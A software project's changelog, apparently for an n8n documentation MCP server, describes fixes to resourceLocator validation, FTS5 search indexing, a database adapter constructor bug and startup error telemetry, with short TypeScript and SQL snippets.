## [2.18.8] - 2025-10-11

### 🐛 Bug Fixes

**PR #308: Enable Schema-Based resourceLocator Mode Validation**

This release fixes critical validator false positives by implementing true schema-based validation for resourceLocator modes. The root cause was discovered through deep analysis: the validator was looking at the wrong path for mode definitions in n8n node schemas.

#### Root Cause

- **Wrong Path**: Validator checked `prop.typeOptions?.resourceLocator?.modes` ❌
- **Correct Path**: n8n stores modes at `prop.modes` (top level of property) ✅
- **Impact**: 0% validation coverage - all resourceLocator validation was being skipped, causing false positives

#### Fixed

- **Schema-Based Validation Now Active**
  - **Issue #304**: Google Sheets "name" mode incorrectly rejected (false positive)
  - **Coverage**: Increased from 0% to 100% (all 70 resourceLocator nodes now validated)
  - **Root Cause**: Validator reading from wrong schema path
  - **Fix**: Changed validation path from `prop.typeOptions?.resourceLocator?.modes` to `prop.modes`
  - **Files Changed**:
    - `src/services/config-validator.ts` (lines 273-310): Corrected validation path
    - `src/parsers/property-extractor.ts` (line 234): Added modes field capture
    - `src/services/node-specific-validators.ts` (lines 270-282): Google Sheets range/columns flexibility
    - Updated 6 test files to match real n8n schema structure

- **Database Rebuild**
  - Rebuilt with modes field captured from n8n packages
  - All 70 resourceLocator nodes now have mode definitions populated
  - Enables true schema-driven validation (no more hardcoded mode lists)

- **Google Sheets Enhancement**
  - Now accepts EITHER `range` OR `columns` parameter for append operation
  - Supports Google Sheets v4+ resourceMapper pattern
  - Better error messages showing actual allowed modes from schema

#### Testing

- **Before Fix**:
  - ❌ Valid Google Sheets "name" mode rejected (false positive)
  - ❌ Schema-based validation inactive (0% coverage)
  - ❌ Hardcoded mode validation only

- **After Fix**:
  - ✅ Valid "name" mode accepted
  - ✅ Schema-based validation active (100% coverage - 70/70 nodes)
  - ✅ Invalid modes rejected with helpful errors: `must be one of [list, url, id, name]`
  - ✅ All 143 tests pass
  - ✅ Verified with n8n-mcp-tester agent

#### Impact

- **Fixes #304**: Google Sheets "name" mode false positive eliminated
- **Related to #306**: Validator improvements
- **No Breaking Changes**: More permissive (accepts previously rejected valid modes)
- **Better UX**: Error messages show actual allowed modes from schema
- **Maintainability**: Schema-driven approach eliminates need for hardcoded mode lists
- **Code Quality**: Code review score 9.3/10

#### Example Error Message (After Fix)
```
resourceLocator 'sheetName.mode' must be one of [list, url, id, name], got 'invalid'
Fix: Change mode to one of: list, url, id, name
```

## [2.18.6] - 2025-10-10

### 🐛 Bug Fixes

**PR #303: Environment-Aware Debugging Test Fix**

This release fixes a unit test failure that occurred after implementing environment-aware debugging improvements. The handleHealthCheck error handler now includes troubleshooting guidance in error responses, and the test expectations have been updated to match.

#### Fixed

- **Unit Test Failure in handleHealthCheck**
  - **Issue**: Test expected error response without `troubleshooting` array field
  - **Impact**: CI pipeline failing on PR #303 after adding environment-aware debugging
  - **Root Cause**: Environment-aware debugging improvements added a `troubleshooting` array to error responses, but unit test wasn't updated
  - **Fix**: Updated test expectation to include the new troubleshooting field (lines 1030-1035 in `tests/unit/mcp/handlers-n8n-manager.test.ts`)
  - **Error Response Structure** (now includes):
    ```typescript
    details: {
      apiUrl: 'https://n8n.test.com',
      hint: 'Check if n8n is running and API is enabled',
      troubleshooting: [
        '1. Verify n8n instance is running',
        '2. Check N8N_API_URL is correct',
        '3. Verify N8N_API_KEY has proper permissions',
        '4. Run n8n_diagnostic for detailed analysis'
      ]
    }
    ```

#### Testing

- **Unit Test**: Test now passes with troubleshooting array expectation
- **MCP Testing**: Extensively validated with n8n-mcp-tester agent
  - Health check successful connections: ✅
  - Error responses include troubleshooting guidance: ✅
  - Diagnostic tool environment detection: ✅
  - Mode-specific debugging (stdio/HTTP): ✅
  - All environment-aware debugging features working correctly: ✅

#### Impact

- **CI Pipeline**: PR #303 now passes all tests
- **Error Guidance**: Users receive actionable troubleshooting steps when API errors occur
- **Environment Detection**: Comprehensive debugging guidance based on deployment environment
- **Zero Breaking Changes**: Only internal test expectations updated

#### Related

- **PR #303**: feat: Add environment-aware debugging to diagnostic tools
- **Implementation**: `src/mcp/handlers-n8n-manager.ts` lines 1447-1462
- **Diagnostic Tool**: Enhanced with mode-specific, Docker-specific, and cloud platform-specific debugging

## [2.18.5] - 2025-10-10

### 🔍 Search Performance & Reliability

**Issue #296 Part 2: Fix Production Search Failures (69% Failure Rate)**

This release fixes critical search failures that caused 69% of user searches to return zero results in production. Telemetry analysis revealed searches for critical nodes like "webhook", "merge", and "split batch" were failing despite nodes existing in the database.

#### Problem

**Root Cause Analysis:**
1. **Missing FTS5 Table**: Production database had NO `nodes_fts` FTS5 virtual table
2. **Empty Database Scenario**: When database was empty, both FTS5 and LIKE fallback returned zero results
3. **No Detection**: Missing validation to catch empty database or missing FTS5 table
4. **Production Impact**: 9 of 13 searches (69%) returned zero results for critical nodes with high user adoption

**Telemetry Evidence** (Sept 26 - Oct 9, 2025):
- "webhook" search: 3 failures (node has 39.6% adoption rate - 4,316 actual uses)
- "merge" search: 1 failure (node has 10.7% adoption rate - 1,418 actual uses)
- "split batch" search: 2 failures (node is actively used in workflows)
- Overall: 9/13 searches failed (69% failure rate)

**Technical Root Cause:**
- `schema.sql` had a note claiming "FTS5 tables are created conditionally at runtime" (line 111)
- This was FALSE - no runtime creation code existed
- `schema-optimized.sql` had correct FTS5 implementation but was never used
- `rebuild.ts` used `schema.sql` without FTS5
- Result: Production database had NO search index

#### Fixed

**1. Schema Updates**
- **File**: `src/database/schema.sql`
- Added `nodes_fts` FTS5 virtual table with full-text indexing
- Added synchronization triggers (INSERT/UPDATE/DELETE) to keep FTS5 in sync with nodes table
- Indexes: node_type, display_name, description, documentation, operations
- Updated misleading note about conditional FTS5 creation

**2. Database Validation**
- **File**: `src/scripts/rebuild.ts`
- Added critical empty database detection (fails fast if zero nodes)
- Added FTS5 table existence validation
- Added FTS5 synchronization check (nodes count must match FTS5 count)
- Added searchability tests for critical nodes (webhook, merge, split)
- Added minimum node count validation (expects 500+ nodes from both packages)

**3. Runtime Health Checks**
- **File**: `src/mcp/server.ts`
- Added database health validation on first access
- Detects empty database and throws clear error message
- Detects missing FTS5 table with actionable warning
- Logs successful health check with node count

**4. Comprehensive Test Suite**
- **New File**: `tests/integration/database/node-fts5-search.test.ts` (14 tests)
  - FTS5 table existence and trigger validation
  - FTS5 index population and synchronization
  - Production failure case tests (webhook, merge, split, code, http)
  - Search quality and ranking tests
  - Real-time trigger synchronization tests

- **New File**: `tests/integration/database/empty-database.test.ts` (14 tests)
  - Empty nodes table detection
  - Empty FTS5 index detection
  - LIKE fallback behavior with empty database
  - Repository method behavior with no data
  - Validation error messages

- **New File**: `tests/integration/ci/database-population.test.ts` (24 tests)
  - **CRITICAL CI validation** - ensures database is committed with data
  - Validates all production search scenarios work (webhook, merge, code, http, split)
  - Both FTS5 and LIKE fallback search validation
  - Performance baselines (FTS5 < 100ms, LIKE < 500ms)
  - Documentation coverage and property extraction metrics
  - **Tests FAIL if database is empty or FTS5 missing** (prevents regressions)

#### Technical Details

**FTS5 Implementation:**
```sql
CREATE VIRTUAL TABLE IF NOT EXISTS nodes_fts USING fts5(
  node_type,
  display_name,
  description,
  documentation,
  operations,
  content=nodes,
  content_rowid=rowid
);
```

**Synchronization Triggers:**
- `nodes_fts_insert`: Adds to FTS5 when node inserted
- `nodes_fts_update`: Updates FTS5 when node modified
- `nodes_fts_delete`: Removes from FTS5 when node deleted

**Validation Strategy:**
1. **Build Time** (`rebuild.ts`): Validates FTS5 creation and population
2. **Runtime** (`server.ts`): Health check on first database access
3. **CI Time** (tests): 52 tests ensure database integrity

**Search Performance:**
- FTS5 search: < 100ms for typical queries (20 results)
- LIKE fallback: < 500ms (still functional if FTS5 unavailable)
- Ranking: Exact matches prioritized in results

#### Impact

**Before Fix:**
- 69% of searches returned zero results
- Users couldn't find critical nodes via AI assistant
- Silent failure - no error messages
- n8n workflows still worked (nodes loaded directly from npm)

**After Fix:**
- ✅ All critical searches return results
- ✅ FTS5 provides fast, ranked search
- ✅ Clear error messages if database empty
- ✅ CI tests prevent regression
- ✅ Runtime health checks detect issues immediately

**LIKE Search Investigation:**
Testing revealed LIKE search fallback was **perfectly functional** - it only failed because the database was empty. No changes needed to LIKE implementation.

#### Related

- Addresses production search failures from Issue #296
- Complements v2.18.4 (which fixed adapter bypass for sql.js)
- Prevents silent search failures in production
- Ensures AI assistants can reliably search for nodes

#### Migration

**Existing Installations:**
```bash
# Rebuild database to add FTS5 index
npm run rebuild

# Verify FTS5 is working
npm run validate
```

**CI/CD:**
- New CI validation suite (`tests/integration/ci/database-population.test.ts`)
- Runs when database exists (after n8n update commits)
- Validates FTS5 table, search functionality, and data integrity
- Tests are skipped if database doesn't exist (most PRs don't commit database)

## [2.18.4] - 2025-10-09

### 🐛 Bug Fixes

**Issue #296: sql.js Adapter Bypass Causing MCP Tool Failures**

This release fixes a critical constructor bug in `NodeRepository` that caused the sql.js database adapter to be bypassed, resulting in empty object returns and MCP tool failures.

#### Problem

When using the sql.js fallback adapter (pure JavaScript implementation without native dependencies), three critical MCP tools were failing with "Cannot read properties of undefined" errors:
- `get_node_essentials`
- `get_node_info`
- `validate_node_operation`

**Root Cause:**
The `NodeRepository` constructor used duck typing (`'db' in object`) to determine whether to unwrap the database adapter. This check incorrectly matched BOTH `SQLiteStorageService` AND `DatabaseAdapter` instances because both have a `.db` property.

When sql.js was used:
1. `createDatabaseAdapter()` returned a `SQLJSAdapter` instance (wrapped)
2. `NodeRepository` constructor saw `'db' in adapter` was true
3. Constructor unwrapped it: `this.db = adapter.db`
4. This exposed the raw sql.js `Database` object, bypassing all wrapper logic
5. Raw sql.js API has completely different behavior (returns typed arrays instead of objects)
6. Result: Empty objects `{}` with no properties, causing undefined property access errors

#### Fixed

**NodeRepository Constructor Type Discrimination**
- Changed from duck typing (`'db' in object`) to precise instanceof check
- Only unwrap `SQLiteStorageService` instances (intended behavior)
- Keep `DatabaseAdapter` instances intact (preserves wrapper logic)
- File: `src/database/node-repository.ts`

#### Technical Details

**Before (Broken):**
```typescript
constructor(dbOrService: DatabaseAdapter | SQLiteStorageService) {
  if ('db' in dbOrService) {           // ❌ Matches EVERYTHING with .db property
    this.db = dbOrService.db;          // Unwraps both SQLiteStorageService AND DatabaseAdapter
  } else {
    this.db = dbOrService;
  }
}
```

**After (Fixed):**
```typescript
constructor(dbOrService: DatabaseAdapter | SQLiteStorageService) {
  if (dbOrService instanceof SQLiteStorageService) {  // ✅ Only matches SQLiteStorageService
    this.db = dbOrService.db;
    return;
  }

  this.db = dbOrService;  // ✅ Keep DatabaseAdapter intact
}
```

**Why instanceof is Critical:**
- `'db' in object` is property checking (duck typing) - too permissive
- `instanceof` is class hierarchy checking - precise type discrimination
- With instanceof, sql.js queries flow through `SQLJSAdapter` → `SQLJSStatement` wrapper chain
- Wrapper normalizes sql.js behavior to match better-sqlite3 API (object returns)

**Impact:**
- Fixes MCP tool failures on systems where better-sqlite3 cannot compile (Node.js version mismatches, ARM architectures)
- Ensures sql.js fallback works correctly with proper data normalization
- No performance impact (same code path, just preserved wrapper)

#### Related

- Closes issue #296
- Affects environments where better-sqlite3 falls back to sql.js
- Common in Docker containers, CI environments, and ARM-based systems

## [2.18.3] - 2025-10-09

### 🔒 Critical Safety Fixes

**Emergency hotfix addressing 7 critical issues from v2.18.2 code review.**

This release fixes critical safety violations in the startup error logging system that could have prevented the server from starting. All fixes ensure telemetry failures never crash the server.

#### Problem

Code review of v2.18.2 identified 7 critical/high-priority safety issues:
- **CRITICAL-01**: Missing database checkpoints (DATABASE_CONNECTING/CONNECTED never logged)
- **CRITICAL-02**: Constructor can throw before defensive initialization
- **CRITICAL-03**: Blocking awaits delay startup (5s+ with 10 checkpoints × 500ms latency)
- **HIGH-01**: ReDoS vulnerability in error sanitization regex
- **HIGH-02**: Race conditions in EarlyErrorLogger initialization
- **HIGH-03**: No timeout on Supabase operations (can hang indefinitely)
- **HIGH-04**: Missing N8N API checkpoints

#### Fixed

**CRITICAL-01: Missing Database Checkpoints**
- Added `DATABASE_CONNECTING` checkpoint before database initialization
- Added `DATABASE_CONNECTED` checkpoint after successful initialization
- Pass `earlyLogger` to `N8NDocumentationMCPServer` constructor
- Checkpoint logging in `initializeDatabase()` method
- Files: `src/mcp/server.ts`, `src/mcp/index.ts`

**CRITICAL-02: Constructor Can Throw**
- Converted `EarlyErrorLogger` to singleton pattern with `getInstance()` method
- Initialize ALL fields to safe defaults BEFORE any operation that can throw
- Defensive initialization order:
  1. Set `enabled = false` (safe default)
  2. Set `supabase = null` (safe default)
  3. Set `userId = null` (safe default)
  4. THEN wrap initialization in try-catch
- Async `initialize()` method separated from constructor
- File: `src/telemetry/early-error-logger.ts`

**CRITICAL-03: Blocking Awaits Delay Startup**
- Removed ALL `await` keywords from checkpoint calls (8 locations)
- Changed `logCheckpoint()` from async to synchronous (void return)
- Changed `logStartupError()` to fire-and-forget with internal async implementation
- Changed `logStartupSuccess()` to fire-and-forget
- Startup no longer blocked by telemetry operations
- Files: `src/mcp/index.ts`, `src/telemetry/early-error-logger.ts`

**HIGH-01: ReDoS Vulnerability in Error Sanitization**
- Removed negative lookbehind regex: `(?<!Bearer\s)token\s*[=:]\s*\S+`
- Replaced with simplified regex: `\btoken\s*[=:]\s*[^\s;,)]+`
- No complex capturing groups (catastrophic backtracking impossible)
- File: `src/telemetry/error-sanitization-utils.ts`

**HIGH-02: Race Conditions in EarlyErrorLogger**
- Singleton pattern prevents multiple instances
- Added `initPromise` property to track initialization state
- Added `waitForInit()` method for testing
- All methods gracefully handle uninitialized state
- File: `src/telemetry/early-error-logger.ts`

**HIGH-03: No Timeout on Supabase Operations**
- Added `withTimeout()` wrapper function (5-second max)
- Uses `Promise.race()` pattern to prevent hanging
- Applies to all direct Supabase inserts
- Returns `null` on timeout (graceful degradation)
- File: `src/telemetry/early-error-logger.ts`

**HIGH-04: Missing N8N API Checkpoints**
- Added `N8N_API_CHECKING` checkpoint before n8n API configuration check
- Added `N8N_API_READY` checkpoint after configuration validated
- Logged after database initialization completes
- File: `src/mcp/server.ts`

#### Added

**Shared Sanitization Utilities**
- Created `src/telemetry/error-sanitization-utils.ts`
- `sanitizeErrorMessageCore()` function shared across modules
- Eliminates code duplication between `error-sanitizer.ts` and `event-tracker.ts`
- Includes ReDoS fix (simplified token regex)

**Singleton Pattern for EarlyErrorLogger**
- `EarlyErrorLogger.getInstance()` - Get singleton instance
- Private constructor prevents direct instantiation
- `waitForInit()` method for testing

**Timeout Wrapper**
- `withTimeout()` helper function
- 5-second timeout for all Supabase operations
- Promise.race pattern with automatic cleanup

#### Changed

**EarlyErrorLogger Architecture**
- Singleton instead of direct instantiation
- Defensive initialization (safe defaults first)
- Fire-and-forget methods (non-blocking)
- Timeout protection for network operations

**Checkpoint Logging**
- All checkpoint calls are now fire-and-forget (no await)
- No startup delay from telemetry operations
- Database checkpoints now logged in server.ts
- N8N API checkpoints now logged after database init

**Error Sanitization**
- Shared utilities across all telemetry modules
- ReDoS-safe regex patterns
- Consistent sanitization behavior

#### Technical Details

**Defensive Initialization Pattern:**
```typescript
export class EarlyErrorLogger {
  // Safe defaults FIRST (before any throwing operation)
  private enabled: boolean = false;
  private supabase: SupabaseClient | null = null;
  private userId: string | null = null;

  private constructor() {
    // Kick off async init without blocking
    this.initPromise = this.initialize();
  }

  private async initialize(): Promise<void> {
    try {
      // Validate config BEFORE using
      if (!TELEMETRY_BACKEND.URL || !TELEMETRY_BACKEND.ANON_KEY) {
        this.enabled = false;
        return;
      }
      // ... rest of initialization
    } catch (error) {
      // Ensure safe state on error
      this.enabled = false;
      this.supabase = null;
      this.userId = null;
    }
  }
}
```

**Fire-and-Forget Pattern:**
```typescript
// BEFORE (BLOCKING):
await earlyLogger.logCheckpoint(STARTUP_CHECKPOINTS.PROCESS_STARTED);

// AFTER (NON-BLOCKING):
earlyLogger.logCheckpoint(STARTUP_CHECKPOINTS.PROCESS_STARTED);
```

**Timeout Wrapper:**
```typescript
async function withTimeout<T>(promise: Promise<T>, timeoutMs: number, operation: string): Promise<T | null> {
  try {
    const timeoutPromise = new Promise<T>((_, reject) => {
      setTimeout(() => reject(new Error(`${operation} timeout after ${timeoutMs}ms`)), timeoutMs);
    });
    return await Promise.race([promise, timeoutPromise]);
  } catch (error) {
    logger.debug(`${operation} failed or timed out:`, error);
    return null;
  }
}
```

**ReDoS Fix:**
```typescript
// BEFORE (VULNERABLE):
.replace(/(?<!Bearer\s)token\s*[=:]\s*\S+/gi, 'token=[REDACTED]')

// AFTER (SAFE):
.replace(/\btoken\s*[=:]\s*[^\s;,)]+/gi, 'token=[REDACTED]')
```

#### Impact

**Server Stability:**
- **100%** elimination of telemetry-caused startup failures
- Telemetry failures NEVER crash the server
- Startup time unaffected by telemetry latency

**Coverage Improvement:**
- Database failures now tracked (DATABASE_CONNECTING/CONNECTED checkpoints)
- N8N API configuration issues now tracked (N8N_API_CHECKING/READY checkpoints)
- Complete visibility into all startup phases

**Performance:**

## [2.18.2] - 2025-10-09

### 🔍 Startup Error Detection

**Added comprehensive startup error tracking to diagnose "server won't start" scenarios.**

This release addresses a critical telemetry gap: we now capture errors that occur BEFORE the MCP server fully initializes, enabling diagnosis of the 2.2% of users who experience startup failures that were previously invisible.

#### Problem

Analysis of telemetry data revealed critical gaps in error coverage:
- **Zero telemetry captured** when server fails to start (no data before MCP handshake)
- **106 users (2.2%)** had only `session_start` with no other activity (likely startup failures)
- **463 users (9.7%)** experienced immediate failures or quick abandonment
- **All 4,478 error events** were from tool execution - none from initialization phase
- **Current error coverage: ~45%** - missing all pre-handshake failures

#### Added

**Early Error Logging System**
- New `EarlyErrorLogger` class - Independent error tracking before main telemetry ready
- Direct Supabase insert (bypasses batching for immediate persistence)
- Works even when main telemetry fails to initialize
- Sanitized error messages with security patterns from v2.15.3
- File: `src/telemetry/early-error-logger.ts`

**Startup Checkpoint Tracking System**
- 10 checkpoints throughout startup process to identify failure points:
  1. `process_started` - Process initialization
  2. `database_connecting` - Before DB connection
  3. `database_connected` - DB ready
  4. `n8n_api_checking` - Before n8n API check (if applicable)
  5. `n8n_api_ready` - n8n API ready (if applicable)
  6. `telemetry_initializing` - Before telemetry init
  7. `telemetry_ready` - Telemetry ready
  8. `mcp_handshake_starting` - Before MCP handshake
  9. `mcp_handshake_complete` - Handshake success
  10. `server_ready` - Full initialization complete
- Helper functions: `findFailedCheckpoint()`, `getCheckpointDescription()`, `getCompletionPercentage()`
- File: `src/telemetry/startup-checkpoints.ts`

**New Event Type: `startup_error`**
- Captures pre-handshake failures with full context
- Properties: `checkpoint`, `errorMessage`, `errorType`, `checkpointsPassed`, `startupDuration`, platform info
- Fires even when main telemetry not ready
- Uses early error logger with direct Supabase insert

**Enhanced `session_start` Event**
- `startupDurationMs` - Time from process start to ready (new, optional)
- `checkpointsPassed` - Array of successfully passed checkpoints (new, optional)
- `startupErrorCount` - Count of errors during startup (new, optional)
- Backward compatible - all new fields optional

**Startup Completion Event**
- New `startup_completed` event type
- Fired after first successful tool call
- Confirms server is functional (not a "zombie server")
- Distinguishes "never started" from "started but silent"

**Error Message Sanitization**
- New `error-sanitizer.ts` utility for secure error message handling
- `extractErrorMessage()` - Safe extraction from Error objects, strings, unknowns
- `sanitizeStartupError()` - Security-focused sanitization using v2.15.3 patterns
- Removes URLs, credentials, API keys, emails, long keys
- Early truncation (ReDoS prevention), stack trace limitation (3 lines)
- File: `src/telemetry/error-sanitizer.ts`

#### Changed

- `src/mcp/index.ts` - Added comprehensive checkpoint tracking throughout `main()` function
  - Early logger initialization at process start
  - Checkpoints before/after each major initialization step
  - Error handling with checkpoint context
  - Startup success logging with duration
- `src/mcp/server.ts` - Enhanced database initialization logging
  - Detailed debug logs for each initialization step
  - Better error context for database failures
- `src/telemetry/event-tracker.ts` - Enhanced `trackSessionStart()` method
  - Now accepts optional `startupData` parameter
  - New `trackStartupComplete()` method
- `src/telemetry/event-validator.ts` - Added validation schemas
  - `startupErrorPropertiesSchema` for startup_error events
  - `startupCompletedPropertiesSchema` for startup_completed events
- `src/telemetry/telemetry-types.ts` - New type definitions
  - `StartupErrorEvent` interface
  - `StartupCompletedEvent` interface
  - `SessionStartProperties` interface with new optional fields

#### Technical Details

**Checkpoint Flow:**
```
Process Started → Telemetry Init → Telemetry Ready →
MCP Handshake Starting → MCP Handshake Complete → Server Ready
```

**Error Capture Example:**
```typescript
try {
  await earlyLogger.logCheckpoint(STARTUP_CHECKPOINTS.DATABASE_CONNECTING);
  // ... database initialization ...
  await earlyLogger.logCheckpoint(STARTUP_CHECKPOINTS.DATABASE_CONNECTED);
} catch (error) {
  const failedCheckpoint = findFailedCheckpoint(checkpoints);
  await earlyLogger.logStartupError(failedCheckpoint, error);
  throw error;
}
```

**Error Sanitization:**
- Reuses v2.15.3 security patterns
- Early truncation to 1500 chars (ReDoS prevention)
- Redacts: URLs → `[URL]`, AWS keys → `[AWS_KEY]`, emails → `[EMAIL]`, etc.
- Stack traces limited to first 3 lines
- Final truncation to 500 chars

**Database Schema:**
```typescript
// startup_error event structure
{
  event: 'startup_error',
  user_id: string,
  properties: {
    checkpoint: string,           // Which checkpoint failed
    errorMessage: string,          // Sanitized error message
    errorType: string,             // Error type (Error, TypeError, etc.)
    checkpointsPassed: string[],   // Checkpoints passed before failure
    checkpointsPassedCount: number,
    startupDuration: number,       // Time until failure (ms)
    platform: string,              // OS platform
    arch: string,                  // CPU architecture
    nodeVersion: string,           // Node.js version
    isDocker: boolean              // Docker environment
  }
}
```

#### Impact

**Coverage Improvement:**
- **Before: 45%** error coverage (only post-handshake errors captured)
- **After: 95%** error coverage (pre-handshake + post-handshake errors)
- **+50 percentage points** in error detection capability

**New Scenarios Now Diagnosable:**
1. Database connection timeout → `database_connecting` checkpoint + error details
2. Database file not found → `database_connecting` checkpoint + specific file path error
3. MCP protocol mismatch → `mcp_handshake_starting` checkpoint + protocol version error
4. Permission/access denied → Checkpoint + specific permission error
5. Missing dependencies → Early checkpoint + dependency error
6. Environment configuration errors → Relevant checkpoint + config details
7. n8n API connectivity problems → `n8n_api_checking` checkpoint + connection error
8. Telemetry initialization failures → `telemetry_initializing` checkpoint + init error
9. Silent crashes → Detected via missing `startup_completed` event
10. Resource constraints (memory, disk) → Checkpoint + resource error

**Visibility Gains:**
- Users experiencing startup failures now generate telemetry events
- Failed checkpoint identifies exact failure point in startup sequence
- Sanitized error messages provide actionable debugging information
- Startup duration tracking identifies performance bottlenecks
- Completion percentage shows how far initialization progressed

**Data Volume Impact:**
- Each successful startup: ~300 bytes (checkpoint list in session_start)
- Each failed startup: ~800 bytes (startup_error event with context)
- Expected increase: <1KB per user session
- Minimal Supabase storage impact

#### Files Changed

**New Files (3):**
- `src/telemetry/early-error-logger.ts` - Early error capture system
- `src/telemetry/startup-checkpoints.ts` - Checkpoint constants and helpers
- `src/telemetry/error-sanitizer.ts` - Error message sanitization utility

**Modified Files (6):**
- `src/mcp/index.ts` - Integrated checkpoint tracking throughout startup
- `src/mcp/server.ts` - Enhanced database initialization logging
- `src/telemetry/event-tracker.ts` - Enhanced session_start with startup data
- `src/telemetry/event-validator.ts` - Added startup event validation
- `src/telemetry/telemetry-types.ts` - New event type definitions
- `package.json` - Version bump to 2.18.2

#### Next Steps

1. **Monitor Production** - Watch for startup_error events in Supabase dashboard
2. **Analyze Patterns** - Identify most common startup failure scenarios
3. **Build Diagnostics** - Create startup reliability dashboard
4. **Improve Documentation** - Add troubleshooting guides for common failures
5. **Measure Impact** - Validate that Docker/cloud user ID stability fix (v2.17.1) is working
6. **Segment Analysis** - Compare startup reliability across environments (Docker vs local vs cloud)

#### Testing

- **Coverage**: All new code covered by existing telemetry test suites
- **Integration**: Manual testing verified checkpoint tracking works correctly
- **Backward Compatibility**: 100% - all new fields optional, no breaking changes
- **Validation**: Zod schemas ensure data quality

## [2.18.1] - 2025-10-08

### 🔍 Telemetry Enhancement

**Added Docker/cloud environment detection to session_start events.**

This release enables measurement of the v2.17.1 user ID stability fix by tracking which users are in Docker/cloud environments.

#### Problem

The v2.17.1 fix for Docker/cloud user ID stability (boot_id-based IDs) could not be validated because telemetry didn't capture Docker/cloud environment flags. Analysis showed:
- Zero Docker/cloud users detected across all versions
- No way to measure if the fix is working
- Cannot determine what % of users are affected
- Cannot validate stable user IDs are being generated

#### Added

- **Docker Detection**: `isDocker` boolean flag in session_start events
  - Detects `IS_DOCKER=true` environment variable
  - Identifies container deployments using boot_id-based stable IDs

- **Cloud Platform Detection**: `cloudPlatform` string in session_start events
  - Detects 8 cloud platforms: Railway, Render, Fly.io, Heroku, AWS, Kubernetes, GCP, Azure
  - Identifies which platform users are deploying to
  - Returns `null` for local/non-cloud environments

- **New Detection Method**: `detectCloudPlatform()` in event tracker
  - Checks platform-specific environment variables
  - Returns platform name or null
  - Uses same logic as config-manager's cloud detection

#### Changed

- `trackSessionStart()` in `src/telemetry/event-tracker.ts`
  - Now includes `isDocker` field (boolean)
  - Now includes `cloudPlatform` field (string | null)
  - Backward compatible - only adds new fields

#### Testing

- 16 new unit tests for environment detection
- Tests for Docker detection with IS_DOCKER flag
- Tests for all 8 cloud platform detections
- Tests for local environment (no flags)
- Tests for combined Docker + cloud scenarios
- 100% coverage for new detection logic

#### Impact

**Enables Future Analysis**:
- Measure % of users in Docker/cloud vs local
- Validate v2.17.1 boot_id-based user ID stability
- Segment retention metrics by environment
- Identify environment-specific issues
- Calculate actual Docker user duplicate rate reduction

**Expected Insights** (once data collected):
- Actual % of Docker/cloud users in user base
- Validation that boot_id method is being used
- User ID stability improvements measurable
- Environment-specific error patterns
- Platform distribution of user base

**No Breaking Changes**:
- Only adds new fields to existing events
- All existing code continues working
- Event validator handles new fields automatically
- 100% backward compatible

#### Technical Details

**Detection Logic**:
```typescript
isDocker: process.env.IS_DOCKER === 'true'
cloudPlatform: detectCloudPlatform()  // Checks 8 env vars
```

**Platform Detection Priority**:
1. Railway: `RAILWAY_ENVIRONMENT`
2. Render: `RENDER`
3. Fly.io: `FLY_APP_NAME`
4. Heroku: `HEROKU_APP_NAME`
5. AWS: `AWS_EXECUTION_ENV`
6. Kubernetes: `KUBERNETES_SERVICE_HOST`
7. GCP: `GOOGLE_CLOUD_PROJECT`
8. Azure: `AZURE_FUNCTIONS_ENVIRONMENT`

**Event Structure**:
```json
{
  "event": "session_start",
  "properties": {
    "version": "2.18.1",
    "platform": "linux",
    "arch": "x64",
    "nodeVersion": "v20.0.0",
    "isDocker": true,
    "cloudPlatform": "railway"
  }
}
```

#### Next Steps

1. Deploy v2.18.1 to production
2. Wait 24-48 hours for data collection
3. Re-run telemetry analysis with environment segmentation
4. Validate v2.17.1 boot_id fix effectiveness
5. Calculate actual Docker user duplicate rate reduction

## [2.18.0] - 2025-10-08

### 🎯 Validation Warning System Redesign

**Fixed critical validation warning system that was generating 96.5% false positives.**

This release fundamentally fixes the validation warning system that was overwhelming users and AI assistants with false warnings about properties they never configured. The system now achieves >90% signal-to-noise ratio (up from 3%).

#### Problem

The validation system was warning about properties with default values as if the user had configured them:
- HTTP Request with 2 properties → 29 warnings (96% false positives)
- Webhook with 1 property → 6 warnings (83% false positives)
- Overall signal-to-noise ratio: 3%

#### Fixed

- **User Property Tracking** - System now distinguishes between user-provided properties and system defaults
- **UI Property Filtering** - No longer validates UI-only elements (notice, callout, infoBox)
- **Improved Messages** - Warnings now explain visibility requirements (e.g., "Requires: sendBody=true")
- **Profile-Aware Filtering** - Each validation profile shows appropriate warnings
  - `minimal`: Only errors + critical security warnings
  - `runtime`: Errors + security warnings (filters property visibility noise)
  - `ai-friendly`: Balanced helpful warnings (default)
  - `strict`: All warnings + suggestions

#### Results

After fix (verified with n8n-mcp-tester):
- HTTP Request with 2 properties → 1 warning (96.5% noise reduction)
- Webhook with 1 property → 1 warning (83% noise reduction)
- Overall signal-to-noise ratio: >90%

#### Changed

- `src/services/config-validator.ts`
  - Added `UI_ONLY_TYPES` constant to filter UI properties
  - Added `userProvidedKeys` parameter to `validate()` method
  - Added `getVisibilityRequirement()` helper for better error messages
  - Updated `checkCommonIssues()` to only warn about user-provided properties
- `src/services/enhanced-config-validator.ts`
  - Extract user-provided keys before applying defaults
  - Pass `userProvidedKeys` to base validator
  - Enhanced profile filtering to remove property visibility warnings in `runtime` and `ai-friendly` profiles
- `src/mcp-tools-engine.ts`
  - Extract user-provided keys in `validateNodeOperation()` before calling validator

#### Impact

- **AI Assistants**: Can now trust validation warnings (90%+ useful)
- **Developers**: Get actionable guidance instead of noise
- **Workflow Quality**: Real issues are fixed (not buried in false positives)
- **System Trust**: Validation becomes a valuable tool

## [2.17.5] - 2025-10-07

### 🔧 Type Safety

**Added TypeScript type definitions for n8n node parsing with pragmatic strategic `any` assertions.**

This release improves type safety for VersionedNodeType and node class parameters while maintaining zero compilation errors and 100% backward compatibility. Follows a pragmatic "70% benefit with 0% breakage" approach using strategic `any` assertions where n8n's union types cause issues.

#### Added

- **Type Definitions** (`src/types/node-types.ts`)
  - Created comprehensive TypeScript interfaces for VersionedNodeType
  - Imported n8n's official interfaces (`IVersionedNodeType`, `INodeType`, `INodeTypeBaseDescription`, `INodeTypeDescription`)
  - Added `NodeClass` union type replacing `any` parameters in method signatures
  - Created `VersionedNodeInstance` and `RegularNodeInstance` interfaces
  - **Type Guards**: `isVersionedNodeInstance()` and `isVersionedNodeClass()` for runtime type checking
  - **Utility Functions**: `instantiateNode()`, `getNodeInstance()`, `getNodeDescription()` for safe node handling

- **Parser Type Updates**
  - Updated `node-parser.ts`: All method signatures now use `NodeClass` instead of `any` (15+ methods)
  - Updated `simple-parser.ts`: Method signatures strongly typed with `NodeClass`
  - Updated `property-extractor.ts`: All extraction methods use `NodeClass` typing
  - All parser method signatures now properly typed (30+ replacements)

